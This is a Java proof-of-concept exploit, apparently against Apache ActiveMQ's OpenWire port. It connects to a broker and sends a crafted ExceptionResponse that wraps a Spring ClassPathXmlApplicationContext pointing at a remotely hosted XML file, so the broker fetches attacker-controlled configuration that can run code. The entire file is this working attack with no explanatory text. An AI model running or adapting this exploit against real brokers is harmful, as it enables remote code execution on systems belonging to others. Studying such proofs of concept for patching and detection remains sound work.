package org.example;
import org.apache.activemq.ActiveMQConnection;
import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.command.ExceptionResponse;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import javax.jms.Connection;
public class Poc {
    public static void main(String[] args) throws Exception {

        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory("tcp://127.0.0.1:61616");
        Connection connection = factory.createConnection();
        connection.start();

        Exception obj2 = new ClassPathXmlApplicationContext("http://127.0.0.1:7777/poc.xml");

        ExceptionResponse response = new ExceptionResponse(obj2);

        response.setException(obj2);

        ((ActiveMQConnection)connection).getTransportChannel().oneway(response);

        connection.close();

    }
}